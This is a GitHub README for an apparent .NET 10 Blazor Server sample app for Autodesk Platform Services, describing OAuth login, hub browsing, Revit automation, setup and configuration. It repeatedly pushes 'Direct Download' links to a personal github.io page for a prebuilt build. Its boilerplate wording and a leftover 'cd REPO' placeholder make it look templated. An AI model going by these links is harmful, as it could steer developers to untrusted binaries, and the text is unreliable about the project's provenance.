# Autodesk Platform Services .NET Blazor Samples v2026 - sample web application 2026

> **Sample .NET Blazor Server web app for Autodesk Platform Services.** Created with .NET 10 and C#, this repository walks through APS scenarios for AEC teams, with attention to authentication, data access, and Revit automation workflows in version 2026.

[![Platform](https://img.shields.io/badge/Platform-.NET%20Blazor%20Server-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/felix-baker94/aps-dotnet-blazor-server-samples-v2026?style=flat-square)](https://github.com/felix-baker94/aps-dotnet-blazor-server-samples-v2026)

---

<p align="center">
  <a href="https://felix-baker94.github.io/aps-dotnet-blazor-server-samples-v2026/">
    <img src="https://img.shields.io/badge/Download-Autodesk%20Platform%20Services%20.NET%20Blazor%20Samples%20Latest-brightgreen?style=for-the-badge" alt="Download Autodesk Platform Services .NET Blazor Samples">
  </a>
</p>

> **[Direct Download - Autodesk Platform Services .NET Blazor Samples v2026](https://felix-baker94.github.io/aps-dotnet-blazor-server-samples-v2026/)**

---

[Download Latest Build](https://felix-baker94.github.io/aps-dotnet-blazor-server-samples-v2026/)

---

## What this project is

Autodesk Platform Services .NET Blazor Samples is a sample web application that illustrates how APS-powered experiences can be built with Blazor Server. It is designed for developers who work with AEC information and Autodesk cloud services and want a hands-on reference for common APS flows in a modern .NET application.

The repository combines identity, navigation through data, and automation-focused examples in one codebase. Rather than centering on a single isolated demo, it shows how hubs, projects, Revit model operations, and job progress can be presented together inside one server-side web experience.

---

## Included capabilities

- 3-legged OAuth login flow for Autodesk Platform Services access
- Browse hubs and projects from connected APS accounts
- Create Revit cloud models as part of sample workflows
- Manage Revit links in supported scenarios
- Batch create sheets for Revit-related automation tasks
- Track job status in real time during processing
- Built with .NET 10, C#, and Blazor Server
- Focused on AEC and Design Automation sample patterns

---

## Setup

Clone the repository, then open it in the .NET development environment you normally use.

    git clone https://github.com/felix-baker94/aps-dotnet-blazor-server-samples-v2026.git
    cd REPO

With the .NET 10 SDK installed, restore packages and run the Blazor Server app.

    dotnet restore
    dotnet run

If you prefer the published build, download it from the project page and start it using your local environment configuration.

---

## How to use it

Once the app is running, authenticate through the APS OAuth flow and connect to the Autodesk data you want to review.

Typical workflow:
1. Log in with a 3-legged APS authorization flow.
2. Browse available hubs and projects.
3. Select a project and explore related data.
4. Run sample operations such as Revit cloud model creation or sheet batch creation.
5. Watch job progress updates as tasks move through the queue.

For development and testing, the sample layout can be used as a guide when adapting pages, service calls, or background processing for your own APS-enabled application.

---

## Configuration

Configuration is generally managed through ASP.NET Core app settings together with the APS connection values needed for OAuth and service calls.

Common values are usually stored in the application configuration files or environment variables, such as:

    {
      "APS_CLIENT_ID": "your-client-id",
      "APS_CLIENT_SECRET": "your-client-secret",
      "APS_CALLBACK_URL": "https://localhost:5001/signin-aps"
    }

Update the callback URL, credentials, and any local endpoints so they match your APS app registration and development environment.

---

## Requirements

- .NET 10 SDK
- Blazor Server-compatible hosting environment
- Autodesk Platform Services credentials
- Access to APS-enabled Autodesk data for testing workflows
- A browser for the web interface
- Internet access for Autodesk cloud service communication

---

## FAQ

**Is this a finished product or a sample?**  
It is a sample application meant to show APS patterns inside a Blazor Server project.

**What does it help with?**  
It demonstrates how authentication, data browsing, and Revit-focused automation can be combined in a single web app.

**Where do I change the APS settings?**  
Look in the app configuration files and environment variables used by the ASP.NET Core project.

**Why is the job status updating in real time?**  
The sample includes status tracking so you can follow automation progress while jobs execute.

**What should I do if login or project browsing fails?**  
Check your APS credentials, callback URL, and access to the target hubs or projects, then review the server logs.

**How do I stay current with updates?**  
Check back in the repository regularly and compare your local copy with the latest build or source changes.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
